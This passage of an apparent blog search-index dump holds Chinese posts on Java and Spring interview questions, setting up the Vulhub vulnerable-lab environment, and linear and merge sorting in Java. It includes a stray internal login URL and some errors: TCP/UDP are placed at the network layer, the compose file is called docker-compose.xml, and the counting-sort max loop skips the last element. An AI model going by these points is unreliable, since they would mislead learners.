7、IOC在项目中的作用IOC解决了对象之间的依赖问题，把所有的Bean的依赖关系通过注解或者配置文件关联起来尽心管理，降低和耦合度。 8、Spring DI的注入方式 构造注入 set注入 接口注入 9、IOC、AOP实现原理 IOC：通过反射机制生成对象进行注入 AOP：通过动态代理 10、Spring MVC的架构/工作流程图 11、spring bean的作用域Spring中通过scope来配置Bean的作用域，scope有五个属性，用来描述不同的作用域 singleton： 使用该属性定义Bean时，IOC容器仅创建一个Bean实例，IOC容器每次返回的是同一个Bean实例。 prototype：使用该属性定义Bean时，IOC容器可以创建多个Bean实例，每次返回的都是一个新的实例。 request：该属性仅对HTTP请求产生作用，使用该属性定义Bean时，每次HTTP请求都会创建一个新的Bean，适用于WebApplicationContext环境。 session： 该属性仅用于HTTP Session，同一个Session共享一个Bean实例。不同的Session使用不同的实例。 global-session： 该属性仅用于HTTP Session，同Session作用域不同的是，所有的session共享一个Bean实例。 12、spring boot比psinrg做了哪些改进？spring5比spring4做了哪些改进？13、如何自定义一个spirng boot starter24、Servlet的生命周期 (adsbygoogle = window.adsbygoogle || []).push({});]]></content>
  </entry>
  <entry>
    <title><![CDATA[Java面试题]]></title>
    <url>%2Fposts%2F2018-11-02-Java%E9%9D%A2%E8%AF%95%E9%A2%98.html</url>
    <content type="text"><![CDATA[1、HashMap和HashTable区别HashMap是HashTable的轻量实现（非线程安全），他们都实现的Map接口，主要区别在于：线程安全，同步，性能 HashTable继承Dictionary，HashMap继承的是java2出现的Map接口； HashMap允许将null作为key或value，hashtable不允许； HashMap是非同步的，HashTable是同步的(synchronized),所以HashMap线程不安全，而HashTable是线程安全的，多个线程可以共享一个HashTbale而不需要为自己的方法实现同步。Java5提供了ConcurrentMap，用来替代HashTable，比HashTable扩展性好； 由于HashMap是非线程安全的，所以单一线程访问，HashMap性能要高于HashTable； HashMap的迭代器（Iterator）是fail-fast迭代器，HashTable的enumerator迭代器不是fail-fast的。 HashMap把HashTable的contains方法去掉了，换成了containsValue和containsKey HashTable中数组默认大小是11，扩容方法是old*2+1;HashMap默认大小是16，扩容每次为2的指数大小 2、Object的hashcode方法，equals方法，常用的地方3、HashMap的原理应用场景简单的说，HashMap是由数组和链表组成的，主体是数组，链表的作用主要是为了解决哈希冲突而存在的。在JDK1.8之后，链表长度超过8之后，会转换为红黑树。HashMap的默认容量为16，阈值为0.75，总容量超过0.75时，会进行2倍扩容。 4、JDK中有哪些线程池Java中通过Executors提供四种线程池： newCachedTheadPool： 创建一个可缓存的线程池，如果线程池长度超过处理需要，可灵活回收空闲线程，若无回收，则创建线程。此线程池不会对线程池大小做限制，线程池大小完全依赖系统能够创建的最大线程大小。 newFixedThreadPool： 创建一个定长线程池，可控制线程最大并发数，超出的线程会在队列中等待 newScheduleThreadPool： 创建一个定长线程池，支持定时及周期性任务执行 newSingleThreadExecutor： 创建一个单线程化的线程池，他只会用唯一的工作线程来执行任务，保证所有任务按照先定顺序（FIFO，LIFO优先级执行） 5、TCP/UDP区别相同点： 都处于OSI七层模型的网络层，都是传输层协议，都能保护网络层的传输，双方通信都需要开放端口。 TCP UDP 1 Transmission Control Protocol 传输控制协议 User Data Protocol 用户数据报协议 2 TCP的传输是可靠传输 UDP的传输是不可靠传输 3 TCP是基于连接的协议，在正式收发数据前，必须和对方建立可靠的连接 UDP是和TCP相对应的协议，他是面向非连接的协议，他不与对方建立连接，而是直接把数据包发送出去 4 TCP是一种可靠的通信服务，负载相对而言比较大，TCP用套接字(socket)或者端口进行通信 UDP是一种不可靠的网络服务，负载相对较小 5 TCP和UP的结构不同，TCP包括序号、确认信号、数据偏移、控制标志(通常URG、ACK、PSH、RST、SYN、FIN)、窗口、检验和、紧急指针、选项等信息 UDP包含长度和检验和信息 6 TCP提供超时重发，丢弃重复数据，检验数据，流量控制等，保证数据从一端传到另一端 UDP不提供可靠性，他只是把应用程序传给IP层的数据发送出去，但是不能保证他们到达目的端 7 TCP发送数据包前会在通信双方间建立三次握手，确保双方准备好，在传输数据包期间，TCP会根据链路中数据流量的大小来调节传送的速率，传输时如果发现有丢包，会有严格的重传机制，故而传输速度很慢 UDP在传输数据报前不用在客户端和服务器之间建立连接，且没有超时重发机制，故而传输速度很快 8 TCP支持全双工和并发的TCP连接，提供确认、重传、拥塞控制 UDP适用于对系统性能要求高于数据完整性的要求，需要简短快捷的数据交换、需要多播和广播的应用环境 6、查找一个数组的中位数7、反射的机制，说说反射的用途和实现，反射是不是很慢，我们在项目中是否应该避免使用反射。8、Object类中的方法9、对象比较是否相等10、toString方法的常用地方，为什么要重写该方法11、HashMap put方法怎么判断是否是重复方法12、Set和List的区别13、ArrayList和LinkedList的区别，List和Map的区别， ArrayList和Vector的区别 ArrayList和LinkedList区别： ArrayList内部是基于数组实现的，因此对于随机访问快，新增删除慢 LinkedList内部是基于链表实现的，因此新增删除快，随机访问慢。 List和Map的区别： List是存储单列数据的集合，存储的数据都是有序并且是可以重复的 Map是存储双列数据的集合，通过键值对存储数据，存储的数据是无序的，Key值不能重复，value值是可以重复的。 ArrayList和Vector的区别： ArrayList是不同步的，也就是不是线程安全的类 Vector是同步的，线程安全 14、TreeSet对存入的数据有什么要求吗？15、HashSet是不是线程安全的16、Java中有哪些线程安全的Map17、CocurrentHashMap是怎么做到线程安全的18、如何保证线程安全问题19、volatile原子性问题？为什么i++不支持原子性20、CAS操作21、lock和synchronized区别22、公平锁和非公平锁23、Java读写锁，读写锁解决的问题24、线程池的原理，为什么要创建线程池？创建线程池的方式？使用线程池的好处： 线程可以重复利用，减少创建、销毁线程带来的系统资源的开销，提高性能 25、线程的生命周期，什么时候会出现僵死进程？26、创建线程池有哪几个核心参数，如何合理配置线程池的大小？27、volatile、ThreadLocal的使用场景和原理28、Synchronized、Volatile区别，Synchronized锁粒度，模拟死锁场景、原子性与可见性。29、JVM内存模型、GC机制和原理30、GC分那两种，Minor GC和Full GC有什么区别，什么情况下会触发Full GC，分别采用什么算法。31、JVM里有几种classloader，为什么会有多种。JVM里有三种类加载器：BootStrap Loader 负责加载系统类，ExtClassLoader负责加载扩展类，AppClassLoader负责加载应用类。 他们的分工不一样，各自负责不同的区域，另外也是为了实现委托模型。 当执行java *.class的时候，java会帮助我们找到jre，接着找到jre内部的jvm.dll，这个才是真正的java虚拟机，最后加载动态库，激活java虚拟机。虚拟机激活后，会先做一些初始化的动作，比如读取系统参数，一旦初始化动作完成，就会产生第一个类加载器-Bootstrap Loader，Bootstrap Loader是由C++编写的，该Loader所做的初始化工作中，除了一些基本的初始化动作之外，最重要的就是加载Launcher.java中的ExtClassLoader，并设定其parent为null，但其实其父加载器就是Bootstrap Loader。然后Bootstrap Loader在要求加载Launcher.java中的AppClassLoader，并设定其Parent为ExtClassLoader。需要注意的是Launcher$ExtClassLoader和Launcher$AppClassLoader都是由BootstrapLoader加载的，所以Parent和由哪个类加载没有关系。 32、什么是双亲委派机制，介绍双亲委派的运作过程和好处双亲委派模式的工作原理是，如果一个类加载器收到了类加载请求，它并不会自己先去加载，而是把这个请求委托给父类的加载器去执行，如果父类加载器还存在其父类加载器，则进一步向上委托，依次递归，请求最终将到达顶层的启动类加载器。如果父加载器可以完成加载任务，就成功返回；如果如果父加载器无法完成加载任务，子加载器才会尝试自己去加载，这就是双亲委托模型。 采用双亲委派模型的害处是Java类随着它的类加载器一起具备了一种带有优先级的层次关系，通过这种层级关系可以避免类的重复加载，当父亲已经加载了该类时，就没有必要子ClassLoader再加载一次。其次是考虑到安全因素，java核心api中定义类型不会随意被替换，比如通过网络传递一个java.lang.Integer的类，通过双亲委派模型传递到父类加载器，而启动类加载器在核心Java API中已经发现了这个类，所以并不会加载网络传递过来的Java.lang.Integer，而是直接返回已经加载过的Integer，这样便可以防止核心API被人随意篡改。 33、什么情况下需要破坏双亲委派机制1、基础类调用用户代码 双亲委派很好地解决了各个类加载器的基础类的同一问题（越基础的类由越上层的加载器进行加载），基础类之所以称为“基础”，是因为它们总是作为被用户代码调用的API，但世事往往没有绝对的完美。如果基础类又要调用回用户的代码，那该么办？一个典型的例子就是JNDI服务，JNDI服务现在已经是Java的标准服务。JNDI的目的是对资源进行集中管理和查找，但是它需要调用有独立厂商实现并部署在应用程序ClassPath下的JNDI接口提供者（如mysql连接驱动、sql连接驱动）的代码，但是启动类加载器不识别这些代码。 为了解决这个问题，Java设计团队引入了一个不太优雅的设计：线程上下文类加载器（Thread Context ClassLoader）。有了线程上下文类加载器，JNDI就可以使用它去加载所需要的SPI代码，也就是父类加载器请求子类加载器去完成类加载的动作，这种行为实际上打破了双薪委派模型层次结构来逆向使用类加载器。JAVA中所有涉及SPI的加载动作基本上都是采用这种方式，例如JNDI、JDBC、JCE、JAXB等。 2、OSGi模块化热部署 OSGI实现模块化热部署的关键是它自定义的类加载器机制的实现，每一个程序模块都有一个自己的类加载器，当需要等换一个模块时，就把模块连同类加载器一起换掉以实现代码的热替换。 34、常见的JVM调优方法有哪些？可以调整哪个参数，调成什么值。35、红黑树的实现原理和应用场景36、NIO是什么，适用于何种场景37、八种基本数据类型的大小，以及他们的封装类byte、short、int、char、float、double、long、boolean1、2、4、2、4、8、8、1Byte、Short、Integer、Character、Float、Double、Long、Boolean 38、引用数据类型类、接口类型、数组类型、枚举类型、注解类型 基本数据类型在创建时，在栈上给其划分一块内存，将数值直接存储在栈上。引用数据类型在创建时，首先在栈上给其引用分配一块内存，而对象的具体信息都存储在堆内存中，然后由栈上的引用指向堆中对象的地址。 39、switch能否用string做参数jdk7之前只能用byte、short、char、int这几个基本数据类型和其对应的封装类型。switch后面的括号内只能放置int类型的数据，由于byte、short、char都可以自动转为int类型，所以可以支持。 jdk7之后整形、枚举类型、字符串都可以，但是jdk7并没有新的指令处理switch string，而是通过string.hashcode，将string转换为int进行判断。 40、equals和==的区别1、使用==比较原生类型如 boolean、int、char等，使用equals比较对象2、==是判断两个变量或者实例是不是指向同一个内存空间。equals是判断两个变量或者实例所指向的内存空间的值是不是相同3、==是指对内存地址进行比较，equals是对字符串的内容进行比较4、==是指引用是否相同，equals指的是值是否相同。 (adsbygoogle = window.adsbygoogle || []).push({});]]></content>
      <categories>
        <category>面试</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>面试</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[漏洞靶场Vulhub使用]]></title>
    <url>%2Fposts%2F2018-11-01-%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BAVulhub%E4%BD%BF%E7%94%A8.html</url>
    <content type="text"><![CDATA[前言 Vulhub是一个面向大众的开源漏洞靶场，采用docker进行搭建，但是无需docker知识，简单执行两条命令即可编译、运行一个完整的靶场环境。该项目旨在让漏洞复现变得更加简单，让安全研究人员更专注于漏洞本身。 安装 我在Centos7上进行的如下步骤，如果在其他类型的机器上，可以参照进行各个环境的安装 123456# 安装gityum install git# 安装docker并启动dockeryum install docker &amp;&amp; systemctl start docker# 安装docker-composeyum install docker-compose 由于该漏洞环境镜像均来自于Dockerhub/Github/软件官网，所以在国内访问可能会存在速度慢、丢包等问题，导致环境地洞太卡，影响正常使用，请自行解决翻墙问题，或者采用加速器进行加速。 docker-compose用户组合服务和内网，有的环境涉及到多个容器、端口等，docker-compose可以做到环境的一键化管理，用户不需要再学习各种参数和用法，只需要简单的执行docker-compose up -d即可启动容器环境。 安装完上述环境之后，可以通过以下命令来下载vulhub环境到任何目录 1git clone https://github.com/vulhub/vulhub.git 启动漏洞环境 docker-compose会自动查找当前目录下的配置文件(默认文件名为docker-compose.xml),并根据其内容编译镜像和启动容器。所以，要运行某个漏洞靶场，需要先进入该漏洞所在的目录。 在vulhub中选择某个环境，进入对应目录。如Flask服务端模板注入漏洞，我们进入flask/ssti目录，执行如下命令，进行漏洞靶场的编译和运行：123cd flask/sstidocker-compose builddocker-compose up -d (adsbygoogle = window.adsbygoogle || []).push({});]]></content>
  </entry>
  <entry>
    <title><![CDATA[算法-排序(下)]]></title>
    <url>%2Fposts%2F2018-09-25-%E7%AE%97%E6%B3%95-%E6%8E%92%E5%BA%8F(%E4%B8%8B).html</url>
    <content type="text"><![CDATA[前言 上一节着重分析了几种常用排序算法的原理、时间复杂度、空间复杂度、稳定性等。今天会接触三种时间复杂度为O(n)的排序算法：桶排序、基数排序、计数排序。因为这些排序算法的时间复杂度是线性的，所以把这类排序算法叫做线性排序。之所以能做到线性的时间复杂度，是因为这三种算法是基于非比较的排序算法，都不涉及元素之间的比较操作。 这几种算法理解起来都不难，时间、空间复杂度分析起来也很简单，但是对要排序的数据要求很苛刻，所以今天要学习的重点是掌握这些排序算法的适用场景。 按照惯例，我先给出一道思考题：如何根据年龄给100万用户排序？，你可能会说，我用上一节讲的归并、快排就可以搞定啊！是的，他们也可以完成功能，但是时间复杂度最低也是$O(n*logN)$。有没有更快的排序方法呢？ 桶排序 首先，我们来看桶排序。桶排序，顾名思义，要用到“桶”，核心思想是将要排序的数据分到几个有序的桶里，每个桶里的数据再单独排序。桶内排完序之后，再把桶里的数据按照顺序依次取出，组成的序列就是有序的了。 桶排序的时间复杂度为什么是O(n)呢？我们一块儿来分析一下。 如果要排序的数据有n个，我们把他们均匀的划分到m个桶内，每个桶里就有k=n/m个元素。每个桶内部使用快速排序，时间复杂度是$O(k*logk)$。m个桶排序的时间复杂度就是$O(m*k*logk)$，因为k=n/m，所以整个桶排序的时间复杂度就是$O(n*log\frac{n}{m})$，当桶的个数m非常接近个数n时，$log\frac{n}{m}$就是一个非常小的常量，这个时候桶排序的时间复杂度就接近O(n)。 桶排序看起来很优秀，那它是不是可以代替前面我们所说的排序算法呢？ 答案是否定的，为了让你理解桶排序的原理，上面我们做了很多假设。实际上桶排序对数据的要求是非常苛刻的。 首先，要排序的数据天然的就能划分成m个桶，并且桶与桶之间有着天然的大小顺序，这样每个桶内的数据都排序之后，桶与桶之间数据不需要再排序了。 其次，数据在各个桶之间的分布是非常均匀的。如果数据经过桶的划分之后，有的桶里的数据非常多，有些非常少，很不均匀，那桶内数据排序的时间复杂度就不是常量级了。在极端情况下，如果数据都被划分到了一个桶里，那就退化为了$O(n*logN)$的排序算法了。 桶排序比较适合用在外部排序中，外部排序是指数据存储在外部磁盘中，数据量比较大，内存有限，无法将数据全部加载到内存中。 比如我们又10GB的订单数据，我们希望按照订单金额（假设金额都是正整数）进行排序，但是我们的内存有限，只有几百MB，没办法一次性把10GB数据全部加载到内存中。这个时候我们怎么办呢？ 现在我来讲一下，如何借助桶排序的处理思想来解决这个问题。 我们可以先扫描一遍文件，看订单金额所处的数据范围。假设经过扫描之后我们得到，订单金额最小的是1元，最大是10万元。我们将所有订单根据金额划分到100个桶里，第一个桶存储1-1000元之间的订单，第二个桶存储1001-2000之间的订单，以此类推。每一个桶对应一个文件，并且按照金额范围大小顺序编号命名（00, 01, 02, 03 … 99）。 理想情况下，如果订单金额在1-10万之间均匀分布，那订单会被均匀划分到100个文件中，每个小文件存储大约100MB的内容，我们就可以将这100个小文件依次读取到内存中进行排序。等所有文件都排序号之后，我们只需要按照订单编号，从小到大依次读取每个小文件中的订单数据，并将其写入到一个文件中，那这个文件中存储的就是按照金额从小到大的订单数据了。 不过，你可能也发现了，订单金额在1元到10万元之间并不一定是均匀分布的，所以10GB订单数据是无法均匀的划分到100个文件中的。有可能某个金额区间的数据特别多，划分之后对应的文件就会特别大，没法一次性读入内存，这时候该怎么办呢？ 针对这些划分之后还是比较大的文件，我们可以继续划分，比如，订单金额在1-1000之间的比较多，我们可以将这个区间再划分为10个小区间，1元到100元，101元到200元，201元到300元……901到1000元。如果划分之后，101元到200元之间订单还是太多，那就在继续划分，直到所有的文件都能读入内存为止。 计数排序 个人觉得，计数排序其实是桶排序的一种特殊情况。当要排序的n个数据，所处的范围并不大时，比如最大值是k，我们可以把数据分成k个桶，每个数据桶内的数据值是相同的，这样就省去了桶内的数据排序的时间。 我们都经历过高考，高考计分系统还记得吗？我们查分数的时候，会显示我们的成绩以及所在省的排名。如果你所在省的考生有50万，那如何根据成绩快速排序得出名次呢？ 考生的满分是900分，最低是0分，这个数据的范围很小，所以我们可以分成901个桶，对应分数从0分到900分，根据考生的成绩，我们将这50万个考生划分到这901个桶内，桶内的数据都是分数相同的考生，所有并不需要排序。我们只需要依次扫描每个桶，将桶内的考生输出到一个数组中，就实现了50万考生的排序。因为只涉及扫描遍历操作，所以时间复杂度是O(n)。 计数排序的算法思想就是这么简单，跟桶排序非常类似，只是桶的大小粒度不一样。不过，为什么这个算法叫做”计数”排序呢？”计数”的含义来自哪里？ 想弄明白这个问题，我们就要来看计数排序算法的实现方法。我们还是拿考生那个例子，为了方便说明，我对数据规模做了简化。假设猪油8个考生，分数在0-5之间，这8个考生的成绩存放在一个数组A[8]中，他们分别是2,5,3,0,2,3,0,3。 考生的成绩从0分到5分，我们使用大小为6个数组C[6]表示桶，其中下标对应考生个数。像我们刚刚举得例子，我们只需要遍历以便考生分数，就可以得到C[6]的值。 从图中可以看出，分数为3分的考生有3个，小于3分的考生有4个，所以，成绩为3的考生在排序之后的有序数组R[8]中，会保存下标4,5,6的位置。 那如何快速计算出，每个分数的考生在有序数组中对应的存储位置呢？这个处理方法很巧妙，很不容易想到。 思路是这样的：我们对C[6]数组顺序求和，C[6]数组就变成了下面这个样子。C[k]里存储的就是小于等于分数k的考生个数。 有了前面的数据准备之后，现在就要讲解计数排序中最复杂、最难理解的一部分了。 我们从后向前依次扫描数组A。比如，当扫描到3时，我们可以从数组C中取出下标为3的值7，也就是说，到目前为止，包括自己在内，分数小于等于3的考生有7个，也就是说3是数组R中第7个元素（也就是R[6]的位置）。当3放入数组R中后，小于等于3的元素就剩下了6个了，所以对应的C[6]也要减一，变成6。 以此类推，当我们扫描到第二个分数为3的考生的时候，就会把它放入数组R中的第6个元素的位置(也就是下标为5的位置)。当我们扫描完数组A后，数组R内的数据就是按照分数从小到大有序排列的了。 上面的过程有点复杂，我将其写成代码如下，你可以对照看下。 123456789101112131415161718192021222324252627282930313233343536373839public class CountSort &#123; public static void main(String[] args) &#123; int[] a = new int[] &#123;5,4,2,6,2,3,5,1,4,8,5,9,6,7,8,10,3,4,2,0&#125;; // 20个人的成绩进行计数排序 System.out.println("计数排序前："+Arrays.toString(a)); countSort(a); System.out.println("计数排序后："+Arrays.toString(a)); &#125; private static void countSort(int[] a) &#123; int n = a.length; /* 创建桶数组C */ // 1、查找原数组的数据范围（必须是正整数） int max = a[0]; for (int i = 0; i&lt;a.length-1;i++)&#123; if (a[i]&gt;max)&#123; max = a[i]; &#125; &#125; // 2、根据数据范围创建桶数组 int[] C = new int[max+1]; // 2.1、扫描原数组，将数据的个数放入桶C中 for (int anA : a) &#123; C[anA]++; &#125; // 2.2、将C数组中的数据依次累加 for (int i=1;i&lt;=max;i++)&#123; C[i] = C[i-1] + C[i]; &#125; // 3、根据C桶中的计数将原数组a中的数据依次放入A数组中 // 3.1、创建临时数组A int[] A = new int[n]; // 3.2、从后向前扫描a，并根据C放入A for (int i = n-1; i&gt;=0; i--)&#123; A[C[a[i]]-1] = a[i]; C[a[i]]--; &#125; // 4、拷贝数组A到原数组a System.arraycopy(A, 0, a, 0, n); &#125;&#125; 这种利用另外一个数组来计数的实现方式是不是非常巧妙呢？这也是这种排序算法加计数排序的原因。不过，你千万不要死记硬背上面的排序过程，重要的是理解和应用。 总结一下，计数排序只能用在数据范围不大的场合，如果数据范围k比要排序的数据n大很多，就不适合用计数排序了。而且，计数排序只能给非负整数排序，如果要排序的数据是其他类型的，要将其在不改变相对大小的情况下，转化为非负整数。 比如，还是拿考生这个例子。如果考生的成绩精确到小数后一位，我们就需要将所有的分数乘以10，转化为整数。然后在放入到9010个桶中。再比如，如果要排序的数据中有负数，数据范围是[-1000,1000]，那我们就需要对每个数据先加1000，转化为非负整数。 基数排序 我们再来看这样一个问题。假如我们有10万个手机号码，希望将这10万个手机号码从小到大排序，你有什么比较快速的排序方法？ 我们之前讲的快排，时间复杂度可以做到$O(nlogN)$，还有更高效的排序算法吗？桶排序、计数排序能排上用场吗？手机号有11位，范围很大，显然不适合用这两种算法。针对这个排序问题，有没有时间复杂度是O(n)的排序算法呢？下面我们就来看一种新的排序算法：基数排序。 刚刚这个问题有这样的规律：如果比较的两个手机号a、b，前面的几位中，a手机号码已经比b大了，那后面的几位就不用比较了。 借助稳定排序算法，这里有一个巧妙的实现思路。还记得在排序第一节中，我们讲到排序算法的稳定性时提到的订单的例子吗？我们这里也可以借助相同的处理思路，先按照最后一位来排序手机号，然后，再利用稳定排序算法按照倒数第二位来重新排序，以此类推，最后按照第一位重新排序，经过11次排序之后，手机号就有序了。 手机号码稍微有点长，画图不容易看清楚，我这里用三位数进行排序的例子，画了一张基数排序的过程分解图，你可以看下： 注意，这里按照每位进行排序的排序算法必须是稳定的，否则这个实现思路就是不正确的。因为如果是非稳定排序，那最后一次排序只会考虑最高位的大小顺序，完全不会管其他位的大小关系，那么低位的排序就完全没有意义了。 根据每一位来排序，我们可以用刚刚讲过的桶排序或者计数排序，他们的时间复杂度可以做到O(n)，如果要排序的数据有k位，那我们就要k次桶排序或者计数排序，总的时间复杂度是O(k*n)。当k不大的时候，比如手机号排序的例子，k最大就是11，所以基数排序的时间复杂度近似于O(n)。 实际上，有时候要排序的数据并不都是等长的，比如我们排序牛津字典中的20万个英文单词，最短的只有一个字母，最长的大概有45个字母，那么对于这种不等长的数据，基数排序还适用吗？ 实际上，我们可以把所有的单词补齐到相同的长度，位数不够的可以在后面补“0”，因为根据ASCII表，所有的字母值都大于“0”，所以补“0”并不会影响到原有的大小顺序，这样就可以继续基数排序了。 总结一下，基数排序对于要排序的数据是有要求的，需要可以分割出独立的“位”来比较，而且位之间有递进的关系，如果a数据的高位比b数据大，那剩下的位就不需要比较了，除此之外，每一位的数据范围不能太大，要可以用线性排序来排序，否则，基数排序的时间复杂度就不可能做到O(n)。 解答开篇 今天的内容学完了，我们在回过头来看开篇的问题：如何按照年龄给100万用户排序？现在是不是问题变得简单了。 实际上，根据年龄给100万用户排序，就类似按照成绩给50万用户排序。我们假设年龄的范围最小1岁，最大不超过120岁，我们可以遍历这100万用户，根据年龄将其放入这120个桶中，然后依次遍历这120个桶中的元素，这样就得到了按照年龄排序的100万用户数据。 内容小结 今天，我们学习了三种线性时间复杂度的排序算法，有桶排序、计数排序、基数排序。他们对要排序的数据有非常严格的要求，应用不是很广泛，但是如果数据特征符合这些排序算法的要求，应用这些算法，会非常高效，线性时间复杂度可以达到O(n)。 桶排序和计数排序非常相似，都是针对数据范围不大的数据，将数据划分成不同的桶来实现排序。基数排序要求数据可以排成高低位，高位相同在比较低位。而且每一位的数据范围都不能太大，因为基数排序算法需要借助桶排序或计数排序实现每一位的排序工作。 课后思考我们今天讲的都是针对特殊数据的排序算法。实际上，还有很多看似是排序但又不需要使用排序算法就能处理的排序问题。 假设我们现在需要对D,a,F,B,c,A,z这个字符串进行排序，要求将其中所有的小写字母都排在大写字母的前面，但小写字母内部和大写字母内部不要求有序。比如经过排序之后为a,c,z,D,F,B,A，这个如何来实现呢？如果字符串中存储的不仅有大小写字母，还有数字，要将小写字母放到前面，大写字母放到最后，数字放到中间，不用排序算法，又该怎么解决呢？ https://219.143.144.206:1443/relogin.html?ReloginCause=3&amp;LangMode=2&amp;UserID=&amp;RandomID=&amp;CsrfTk=VB3JXD3J2IUAZFXDYE3J&amp; (adsbygoogle = window.adsbygoogle || []).push({});]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>排序</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[算法-排序(中)]]></title>
    <url>%2Fposts%2F2018-09-23-%E7%AE%97%E6%B3%95-%E6%8E%92%E5%BA%8F(%E4%B8%AD).html</url>
    <content type="text"><![CDATA[前言 上一节讲到冒泡排序、插入排序、选择排序这三种排序算法，他们的时间复杂度都是$O(n^2)$，比较高，适合小规模的排序。今天讲两种时间复杂度为$O(nlogN)$的排序算法，归并排序和快速排序。这两种算法适合大规模的数据排序，比上一节的三种算法更常用。 归并排序和快速排序都用到了分治思想，非常巧妙，我们可以借鉴这个思想，来解决非排序的问题，比如：如何在O(n)时间复杂度内查找一个无序数组中的第K大元素？，这就要用到今天讲的内容。 归并排序的原理 我们先来看看归并排序。 归并排序的核心思想还是蛮简单的。如果需要排序一个数组，我们先把数组从中间分成前后两部分，然后对前后两部分分别排序，再将排好序的两部分合并在一起，这样整个数组就有序了。 归并排序使用的就是分治思想。分治，顾名思义就是分而治之。将一个大问题分解为若干个小问题来解决，小问题解决了，大问题也就解决了。 从我们刚才的描述，你有没有感觉到，分治思想跟我们前面讲过的递归想想很想。是的，分治思想一般都是用递归来实现的。分治是一种解决问题的处理思想，递归是一种编程技巧，这两者并不冲突。 前面我通过举例让你对归并有了一个感性的认识，又告诉你，归并排序用的是分治思想，可以用递归来实现。我们现在就来看看如何用递归代码实现归并排序。 我们在递归那一节讲的递归代码的编程技巧你还记得吗？递归代码的技巧就是，分析得出递推公式，然后找到终止条件，最后将递推公式翻译成递归代码。所以，要想写出归并排序的代码，我们先写出归并排序的递推公式。 12345递推公式merge_sort(p...r) = merge(merge_sort(p...q), merge_sort(q+1...r))终止条件p&gt;=r 不在继续分解 我来解释一下这个公式，merge_sort(p…r)表示给下标在p到r之间的数组排序，我们将这个问题转化为了两个子问题，merge_sort(p…q)和merge_sort(q+1…r)，其中下标q就是p和r的中间位置，也就是q=(p+r)/2,。当下标p到q和从q+1到r这两个子数组都排好序之后，我们在将两个有序的子数组合并在一起，这样下标p到r之间的数据也就排好序了。 有了递推公式，转化成代码就简单多了。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051// 归并排序public static void merge_sort(int[] a, int n)&#123; merge_sort(a, 0, n-1);&#125;private static void merge_sort(int[] a, int p, int r)&#123; // 递归终止条件 if (p&gt;=r) return; // 获取分区点 int q = p + (r-p)/2; // 分治排序左边 merge_sort(a, p, q); // 分治排序右边 merge_sort(a, q+1, r); // 将p-q 和 q+1-r 两个数组合并为一个数组并赋值给a[p,r] merge(a, p, q, r);&#125;// 合并数组private static void merge(int[] a, int p, int q, int r)&#123; int i = p; int j = q + 1; int k = 0; // 合并数组 a[p, q] a[q+1, r] 到临时数组temp // 申请一个临时数组 int[] temp = new int[r - p + 1]; // 根据两个数组最短的长度进行比较添加到temp中 while (i&lt;=q&amp;&amp; j&lt;=r)&#123; if (a[i]&lt;=a[j])&#123; temp[k++] = a[i++]; &#125;else &#123; temp[k++] = a[j++]; &#125; &#125; // 看哪个数组还没有完成，将其放到temp后 if (i&lt;=q)&#123; while (i&lt;=q)&#123; temp[k++] = a[i++]; &#125; &#125;else &#123; while (j&lt;=r)&#123; temp[k++] = a[j++]; &#125; &#125; System.out.println(Arrays.toString(temp)); // 将temp中对应的数据放入原数组中 for (i = 0; i &lt;= r-p; i++) &#123; a[p+i] = temp[i]; &#125;&#125; 你可能已经发现了，merge(A[p…r], A[p…q], A[q+1…r])这个函数的作用就是，讲已经有序的A[p…q]和A[q+1…r]合并成另一个有序的数组，并且放入A[p…r]。那这个过程具体该怎么做呢？ 如图所示，我们申请一个临时数组temp，大小与A[p…r]相同。我们用两个指针i，j分别指向A[p…q]和A[q+1…r]的第一个元素，比较这两个元素A[i]和A[j]，如果A[i]小于A[j]，我们就把A[i]放入temp数组中，并将i后移一位，否则将A[j]放入temp数组中，j后移一位。 继续上述比较过程，知道其中一个子数组中的所有数据都放入临时数组中，再把另外一个数组中的数据依次加入到temp数组的末尾。这个时候，临时数组temp中存储的就是两个子数组合并之后的结果了。最后再把临时数组temp中数据拷贝到原数组里A[p…r]中。 归并排序的性能分析 还记得上节课分析排序算法时的三个问题吗？接下来，我们来看一看归并排序的三个问题。 第一、 归并排序是稳定的排序算法吗？ 结合我们前面的原理图和归并排序的代码，不难发现，归并排序稳不稳定关键要看merge函数，也就是两个有序数组合并为一个有序数组时的那部分代码。 在合并的过程中，如果A[p…q]和A[q+1…r]之间有值相同的元素，我们可以像上面代码中那样，先把A[p…q]中的元素放入临时数组temp中，这样就保证了值相同的元素，合并前后顺序并不会改变。所以，归并排序是一个稳定的排序算法。 第二、归并排序的时间复杂度是多少？ 归并排序涉及递归，时间复杂度的分析稍微有点复杂，我们正好借此机会来学习一下，如果很细递归代码的时间复杂度。 在递归那一节我们讲过，递归适用场景是，一个问题a可以分解为多个子问题b、c，那求解问题a就可以分解为求解子问题b、c。子问题b、c解决之后，我们再把b、c的结果合并成a的结果。 我们定义求解问题a的时间为T(a)，求解问题b、c的时间分别是T(b)、T(c),那我们就可以得到这样的递推公式：$T(a) = T(b) + T(c) + K$。其中K是将两个子问题b、c的结果合并所需的时间。 从上面的分析，我们得出一个重要的结论：不仅递归求解的问题可以写成递推公式，递推代码的时间复杂度也可以写成递推公式。 套用这个公式，我们来分析一下归并排序的时间复杂度。 我们假设对n个元素进行归并排序需要的时间是T(n)，那分解成两个子数组排序的时间都是T(n/2)。我们知道，merge函数合并两个有序子数组的时间复杂度是O(n)。所以套用前面的公式，归并排序的时间复杂度计算公式是：$$\begin{cases}T(1) = C; &amp; n=1 \\[2ex]T(n) = 2*T(\frac{n}{2}) + n; &amp; n&gt;1\end{cases}$$ 通过这个公式，如何来求解T(n)呢？还不够直观，我们再来进一步分解一下计算过程 $$\begin{align*}T(n) \ &amp;= \ 2*T(\frac{n}{2}) \ + \ n \\[2ex]&amp;= 2*(2 * T(\frac{n}{4}) + \frac{n}{2}) \ + \ n \qquad = 4*T(\frac{n}{4}) + 2*n \\[2ex]&amp;= 4*(2* T(\frac{n}{8}) + \frac{n}{4}) \ + \ 2 * n \ \; = 8*T(\frac{n}{8}) + 3*n \\[2ex]&amp;= 8*(2* T(\frac{n}{16}) + \frac{n}{8}) \ + \ 3 * n \ \; 